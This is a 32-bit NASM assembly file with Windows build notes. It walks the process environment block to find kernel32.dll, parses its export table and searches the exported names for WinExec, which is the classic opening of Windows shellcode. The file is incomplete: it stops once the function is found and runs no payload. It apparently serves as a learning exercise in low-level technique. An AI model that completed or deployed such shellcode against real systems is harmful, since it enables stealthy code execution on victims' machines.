BITS 32

section .data
section .bss
section .text
  global main   ; must be declared for linker
;gcc download: https://winlibs.com/#download-release
;nasm download: https://www.nasm.us/
;nasm -f win32 -o example1.o example1.asm
;ld -m i386pe -o example1 example1.o
;objdump -M intel -d example1

;elf32_x86_64: ELF for x64-32, aka x32 — 32-bit x86-64 binaries
;elf_i386: ELF for i386 — 32-bit i386 binaries
;i386linux: a.out for i386
;i386pep: PE+ for x86-64 — Windows-format 64-bit binaries
;i386pe: PE for i386 — Windows-format 32-bit binaries

;https://github.com/ShiftMediaProject/VSNASM

;mov [ecx, [eax] moves the value pointed to by eax
;mov ecx, eax moves the address held by eax
;mov [ecx], eax moves the address held by eax into the value pointed to by ecx 

main:
; form new stack frame
		push ebp
		mov ebp, esp

		; allocate local variables and initialize them to 0
		sub esp, 0x1c
		xor eax, eax
		;mov [ebp - 0x04], eax			; will store number of exported functions
		;mov [ebp - 0x8], eax			; will store address of exported functions addresses table
		;mov [ebp - 0xc], eax			; will store address of exported functions name table
		;mov [ebp - 0x10], eax			; will store address of exported functions ordinal table
		;mov [ebp - 0x14], eax			; will store a null terminated byte string WinExec
		;mov [ebp - 0x18], eax			; will store address to WinExec function
		;mov [ebp - 0x1c], eax		
		
        prepwinexec:
		push 0x00636578				    ; pushing null,c,e,x
		push 0x456e6957				    ; pushing E,n,i,W
		mov [ebp - 0x14], esp			; store pointer to WinExec


		xor eax, eax            ;zero out ecx
		mov eax, [fs:eax+0x30]  ;get PEB
		mov eax, [eax+0xc]      ;get LDR
  
		mov eax, [eax+0x20]     
						  
		mov eax, [eax+0x8]      ;kernel32.dll
		mov ebx, eax            ;move kernel32.dll address into ebx
		mov eax, [ebx + 0x3c]     ;"F0" get 3C (E8 DATA) offset to new EXE header
		add eax, ebx            ; eax now holds address to "PE"
		mov eax, [eax + 0x78]   ;IMAGE OPTIONAL HEADER RVA/EXPORT Table
		add eax, ebx            ;address of export table
		mov ecx, [eax + 0x14]   ;number of exported functions
		mov [ebp-0x4], ecx      ;store # of exported functions
		mov ecx, [eax + 0x1c]   ;get RVA of exported functions table
		add ecx, ebx            ;get address of exported functions table
		mov [ebp-0x8], ecx      ;store address of exported functions table
								;get address of name pointer table
		mov ecx, [eax + 0x20]   ;get RVA of name pointer table
		add ecx, ebx            ;get address of name pointer table
		mov [ebp - 0x0c], ecx   ; store address of name pointer table  
								;get address of functions ordinal table
		mov ecx, [eax + 0x24]			; get RVA of functions ordinal table
		add ecx, ebx					    ; get address of functions ordinal table
		mov [ebp - 0x10], ecx			; store address of functions ordinal table
		
		xor eax, eax
		xor ecx, ecx
		
		;loop through exported function name pointer table and find position of WinExec
		findWinExecPosition:
			mov esi, [ebp - 0x14]		; esi = pointer to WinExec
			mov edi, [ebp - 0xc]		; edi = pointer to exported function names table
			cld											; https://en.wikipedia.org/wiki/Direction_flag
			mov edi, [edi + eax*4]	; get RVA of the next function name in the exported function names table
			add edi, ebx				    ; get address of the next function name in the exported function names table

			mov cx, 8					      ; tell the next-comparison instruction to compare first 8 bytes
			repe cmpsb					    ; check if esi == edi
				
			jz WinExecFound
			inc eax									; increase the counter
			cmp eax, [ebp - 0x4]			; check if we have looped over all the exported function names
			jne findWinExecPosition	
			
			WinExecFound:
			xor eax, eax